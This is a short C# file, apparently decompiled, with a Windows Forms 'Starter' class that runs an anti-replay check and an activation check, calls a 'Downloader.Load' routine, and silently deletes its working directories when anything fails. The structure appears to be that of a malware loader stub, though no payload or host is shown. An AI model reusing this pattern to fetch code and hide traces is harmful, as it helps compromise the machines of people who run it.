using EntryLoader;
using System.IO;
using System.Windows.Forms;

internal class Starter : Form
{
	public static string FileData;

	public static string[] Params;

	public void Start()
	{
		try
		{
			Buffer.Start();
			HandlerParams.Start();
			if (!AntiReplaySender.CheckReplayStart() && EntryPoint.activation && new XS().Start(Params))
			{
				Downloader.Load();
				EntryPoint.close = true;
				return;
			}
		}
		catch
		{
			try
			{
				if (Directory.Exists(Buffer.path_l))
				{
					Directory.Delete(Buffer.path_l, recursive: true);
				}
				if (Directory.Exists(Buffer.path_p))
				{
					Directory.Delete(Buffer.path_p, recursive: true);
				}
			}
			catch
			{
			}
		}
		EntryPoint.close = true;
	}
}
